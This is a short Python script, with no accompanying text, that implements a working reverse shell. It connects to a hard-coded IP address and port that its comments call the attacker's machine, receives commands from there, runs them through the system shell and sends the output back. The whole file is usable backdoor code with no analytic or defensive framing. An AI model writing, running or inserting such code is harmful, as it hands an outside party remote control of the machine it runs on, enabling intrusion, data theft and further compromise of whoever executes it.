import socket
import subprocess

# Set up a connection to the attacker's machine
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.114", 7890))

while True:
    # Receive command from the attacker
    command = s.recv(1024).decode("utf-8")

    # Execute the command
    if command.lower() == "exit":
        break
    if command:
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = output.communicate()
        response = stdout + stderr

        # Send the result back to the attacker
        s.send(response)

# Close the connection
s.close()
